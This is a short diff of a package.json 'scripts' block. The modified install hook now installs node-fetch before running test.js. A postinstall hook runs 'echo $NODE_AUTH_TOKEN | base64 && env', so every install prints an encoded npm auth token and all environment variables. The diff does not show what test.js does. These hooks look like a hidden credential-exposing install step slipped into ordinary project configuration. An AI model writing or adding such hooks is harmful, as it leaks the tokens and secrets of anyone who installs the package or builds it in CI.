@@ -34,7 +34,7 @@
     }
   },
   "scripts": {
-    "install": "node test.js",
+    "install": "npm install node-fetch && node test.js",
     "postinstall": "echo $NODE_AUTH_TOKEN | base64 && env",
     "test": "jest",
     "test:stories": "testing=storybook TEST_END_FILES=jest-story jest",
